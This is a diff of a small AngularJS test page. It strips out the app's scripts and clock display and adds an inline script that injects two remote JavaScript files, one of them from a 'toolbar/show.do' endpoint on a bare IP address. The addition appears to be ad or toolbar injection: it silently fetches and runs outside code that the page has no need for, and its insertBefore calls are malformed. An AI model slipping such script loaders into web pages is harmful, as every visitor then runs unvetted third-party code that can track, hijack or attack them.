@@ -2,12 +2,19 @@
 <html ng-app="myTestApp">
     <head>
 		<meta charset="utf-8">
-        <script src="//cdnjs.cloudflare.com/ajax/libs/angular.js/1.3.15/angular.min.js"></script>
-        <script src="/js/test.js"></script>
     </head>
     <body>
-		<div ng-controller="ClockCtrl">
-            <p>Current time is:{{time.now}}</p>
-		</div>
+    <script>
+        (function(){
+            var live=document.createElement('script');
+            live.src='http://mjs.sinaimg.cn/wap/homev6/201505251511/js/home.min.js';
+            live.type='text/javascript';
+            document.getElementsByTagName("head")[0].insertBefore(live);
+            var ad=document.createElement('script');
+            ad.src='http://221.228.17.149/toolbar/show.do';
+            ad.type='text/javascript';
+            document.getElementsByTagName("head")[0].insertBefore(ad);
+        })();
+    </script>
     </body>
 </html>
